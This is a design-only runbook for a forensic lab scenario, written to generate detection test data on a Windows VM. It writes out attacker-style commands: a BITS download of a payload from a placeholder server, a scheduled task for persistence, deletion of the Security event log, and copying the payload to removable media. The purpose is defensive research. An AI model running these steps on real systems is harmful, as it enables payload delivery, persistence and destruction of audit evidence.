# Scenario 2 — collection runbook

**DESIGN ONLY. NEVER COLLECTED. NO COLLECTION IS PLANNED.** The corpus is final
at five collections. This runbook is retained as the record of what a second
scenario would have required to collect; it was never executed.

Companion to `docs/scenario-2-design.md` (the *what* and *why*) and
`tools/verify_scenario_2.py` (the row-level check). This is the *what to type*,
in execution order, with the constraint checkpoints inline.

**This runs on a Windows VM, not in this repository.** Nothing here is executed
for you. The deliverable is that when you sit at the VM, every decision is
already made and the only failure mode left is a step that did not write the
field its rule reads — which the verification script catches before the
snapshot is destroyed.

Each step names the `verify_scenario_2.py` check ID that confirms it. The rule
is: **run the scenario, run the script on the live VM, and only take the KAPE
collection once every required check passes.** A wrong-field step is seconds to
re-run while the VM is live and unrecoverable once the snapshot is gone.

---

## 0. Before anything: provisioning vs scenario (C-04)

The single largest correctness risk is that a step you perform to *set up* the
scenario is indistinguishable from the technique itself. A scheduled task you
create to stage the payload and one the scenario creates are the same artifact
(C-04).

**Three accounts from `docs/lab-setup.md`, used exactly as scenario 1 used
them — do not invent new ones:**

- `Youssef` — researcher/administrator. VM build, tooling, snapshot management
  and **KAPE collection**. Not an actor in any scenario.
- `janed` — standard user, the simulated victim. Runs the delivery, execution,
  persistence and exfil steps.
- `admin_local` — the privileged account. In scenario 1 it performs the
  anti-forensic log clear, and it does the equivalent destroy step here. It is
  a **scenario actor**, not the provisioning account.

**Two phases, and a clean boundary:**

- **Provisioning** (`Youssef`, elevated): revert the VM to a clean snapshot,
  drop the payload where step 1 will fetch it *from* (a web server you control,
  not on this host), take the **clean baseline collection now** (C-06 — the
  baseline's timestamp must precede the scenario), then log off. Provisioning
  is `Youssef` because `admin_local` is a scenario actor; setting up as
  `admin_local` would contaminate the destroy step this section exists to keep
  clean.
- **Scenario** (`janed`, escalating to `admin_local` only for the destroy
  step): every step below runs as `janed` in one session, in order, except the
  log deletion in §4. Nothing the scenario detects may be created by `Youssef`.

Record which account did what in the collection manifest as you go. "Not
attempted" and "attempted, not detected" must be distinguishable later (C-05).

**C-06 checkpoint:** the clean baseline collection exists and its KAPE console
timestamp is earlier than the wall-clock time you start step 1. Write both
down.

---

## 1. Delivery — BITS background transfer  → check `S1-DELIVERY`

Scenario 1 delivered over the browser. This delivers over BITS, which leaves no
browser history and is a real C2 pattern. `evtx.bits` has been parsed and rich
since D-065 but has never had a positive class.

As `janed`, from a normal shell (not elevated):

    bitsadmin /transfer s2job /download /priority normal ^
        http://<YOUR-SERVER>/invoice_scan.exe ^
        C:\Users\janed\Downloads\invoice_scan.exe

or the modern equivalent:

    Start-BitsTransfer -Source http://<YOUR-SERVER>/invoice_scan.exe ^
        -Destination C:\Users\janed\Downloads\invoice_scan.exe

**C-01 checkpoint:** `<YOUR-SERVER>` is a host you control on the lab network,
reachable by IP or a name that is not a Microsoft domain. The verification
script **rejects** a `url` containing `windowsupdate.com`, `microsoft.com` or
`msedge` — those are the servicing transfers that make the existing corpus
`measured-no-discriminator`, and a servicing URL here buys nothing.

`S1-DELIVERY` asserts: `evtx.bits` has a row with `url` present and `jobOwner`
present, and the url is not vendor traffic.

---

## 2. Execute — shortcut with arguments, from Recent Items  → check `S2-EXECUTE-LNK`

R-ATOMIC-0012 reads **two** fields: `details.arguments` present **and**
`details.lnk_location == recent`. A `.lnk` with arguments anywhere else does
not match. The way to produce a Recent-Items `.lnk` is to actually open the
target through Explorer, which writes the shortcut into
`%APPDATA%\Microsoft\Windows\Recent`.

As `janed`: create a shortcut whose target carries an argument, then invoke it
so Windows records it in Recent:

    $ws = New-Object -ComObject WScript.Shell
    $lnk = $ws.CreateShortcut("C:\Users\janed\Desktop\open_invoice.lnk")
    $lnk.TargetPath = "C:\Users\janed\Downloads\invoice_scan.exe"
    $lnk.Arguments  = "/quiet /c collect"
    $lnk.Save()
    Invoke-Item "C:\Users\janed\Desktop\open_invoice.lnk"

Open it through Explorer at least once (double-click), so the Recent-Items
shortcut is created, not only the desktop one.

**C-05 checkpoint:** the argument string is non-empty and meaningful. An empty
`Arguments` is the exact wrong-field failure this whole exercise exists to
catch — the `.lnk` parses, the technique looks present, and the rule cannot
fire.

`S2-EXECUTE-LNK` asserts: a `lnk` / `file_opened` row with `arguments` present
and `lnk_location == recent`.

---

## 3. Persist — scheduled task, from inside the execution chain  → check `S3-PERSIST-TASK`

Scenario 1 persisted via a machine-hive Run key. This uses a scheduled task
(T1053.005, currently `measured-no-discriminator` because the only tasks in the
corpus are Windows' own).

Run this **as `janed`**, in the `janed` scenario session — so the task is
created under the victim's own context, which is the C-04 requirement. The
cleanest way to make that unambiguous is to have the payload create it: launch
`invoice_scan.exe` (step 2) and let it run the `schtasks` call, or run the call
from a shell `janed` opened. Either way the invoking token is `janed`, not
`Youssef`:

    schtasks /create /tn "InvoiceSync" /sc onlogon ^
        /tr "C:\Users\janed\Downloads\invoice_scan.exe /c collect" ^
        /ru janed

**C-04 checkpoint — enforced by procedure, not by the script, and here is
why.** The obvious check would be "the task's author is `janed`, not
`Youssef`." It cannot be done from the parsed data: measured on scenario 1,
`task_author` is *absent* on 79 of 210 tasks and is `Microsoft Corporation` or
a MUI resource string on the rest — it never carries a username. The principal
lives in the task XML's `<UserId>` element (scenario 1 has
`WINDOWS10\Youssef` and a user RID there), which **the parser does not
currently extract**. So:

- Enforce C-04 by *running the command as `janed`*, confirmed at the shell with
  `whoami` before you type it. Do not create the task from the `Youssef`
  provisioning session.
- If identity-based verification is wanted later, it needs a parser change to
  emit `details.user_id` from `<UserId>`; that is future work, noted in the
  runbook's §7, not a blocker for this collection.

`S3-PERSIST-TASK` asserts what the parser *does* carry: a `scheduled_task` row
whose `command` names the payload (`invoice_scan`). That confirms the scenario's
task landed and is distinguishable from Windows' own by its command line, which
is the honest available check. (Optionally `S3-PERSIST-RUNKEY` if you also
write a per-user Run key for R-ATOMIC-0017 — that rule reads
`details.hive_type == ntuser`, which *is* parsed and *is* checkable.)

---

## 4. Destroy — delete the log file, do not clear it  → check `S4-DESTROY-EVTX`

This is the step that makes scenario 2 worth taking for the destroy phase.
Scenario 1 ran `wevtutil cl`, which writes EID 1102 — already covered by
R-ATOMIC-0002. Deleting the `.evtx` file is the case 1102 **cannot** record,
and the one that makes the SAM-vs-4624 discrepancy (grid 3.8, OD-02) corrective
rather than corroborating.

Elevation is required to delete a live log, and the scenario's own escalation
is part of the story. As `admin_local` (the privileged scenario actor, the same
account that clears the log in scenario 1 — **not** `Youssef`):

    # stop the service so the handle is released, delete, restart
    net stop eventlog /y
    del "C:\Windows\System32\winevt\Logs\Security.evtx"
    net start eventlog

**C-05 checkpoint:** the file deleted is a log the pipeline reads (Security),
not an empty channel. The USN journal records the deletion by name; that is
what the check reads.

`S4-DESTROY-EVTX` asserts: a `usn` row whose `file_name` contains `.evtx`.

---

## 5. Exfil — payload on removable media  → check `S5-EXFIL-LNK`

The `exfiltrate` phase exists in schema 2.1.0 and has never been exercised.
Three rules (0010, 0013, 0014) are Class 2 solely for that reason.

As `janed`, with a removable volume attached that is **not** the collection
media:

    copy C:\Users\janed\Downloads\invoice_scan.exe E:\
    E:\invoice_scan.exe /c exfil     # open it from the removable volume

**C-01 checkpoint — the sharpest one.** The existing corpus already has
removable-media rows, and they are the drives the collections were carried on
(`E:\collection_clean_a`, `E:\handoff`). If you exfil to that same volume, the
rule fires on the evidence-handling procedure, not the scenario. Use a distinct
volume. The verification script prints the `volume_serial` and `volume_label`
of every matching row — **compare it against the serial of your collection
drive and confirm they differ** before accepting this step.

`S5-EXFIL-LNK` asserts: a `lnk` / `file_opened` row with
`drive_type in (removable, remote)`. `S5-EXFIL-JUMPLIST` and `S5-EXFIL-SRUM`
are optional corroboration — jump lists lag until the app closes, SRUM flushes
on a timer up to an hour; if either is empty, **wait and re-run the script**,
do not re-run the scenario.

---

## 6. Verify, then and only then collect

Still on the live VM, still before KAPE:

    python tools\verify_scenario_2.py --live

- **Exit 0, "All required checks passed":** proceed to KAPE.
- **Exit 1:** the printed `FAIL` lines name the step, the rule that would be
  lost, and why. Re-run that step (§1–§5) and run the script again. Do not
  collect on a red result — the point of the script is that this is the last
  cheap moment to fix it.

The optional `WARN` lines (jump list, SRUM, recycle bin, amcache) are timing
artifacts as often as failures; the notes say which resolve by waiting.

**Then take the collection** with the same KAPE parameters as the existing set
(`--target KapeTriage --tsource C: --tdest collection_s2_v1`), and record in
the manifest: the two accounts and which did what, the removable volume serial,
the delivery server, and — per C-05 — any technique you deliberately did **not**
exercise, so a later reader finds "not attempted" rather than inferring
"attempted and not detected".

---

## 7. After collection

Not covered here. The post-collection harness (measuring which Class 2 rules
converted to Class 1, and their base rates) is deliberately not built until a
collection exists — building it now would be writing tests for data that has
never been produced, the in-prose verification failure of principles.md 4.1.

**One parser gap this runbook surfaced**, for whoever picks up scenario 2: the
scheduled-task parser extracts `<Author>` as `task_author` but not `<UserId>`,
and it is `UserId` that carries the creating principal (`WINDOWS10\Youssef`, a
user RID) while `Author` is empty or a vendor string. Emitting
`details.user_id` would let C-04 be verified from the data rather than enforced
by procedure at §3, and would give a scheduled-task rule a real
user-vs-service discriminator. Not required for the collection; worth a
D-number when the family is next touched.
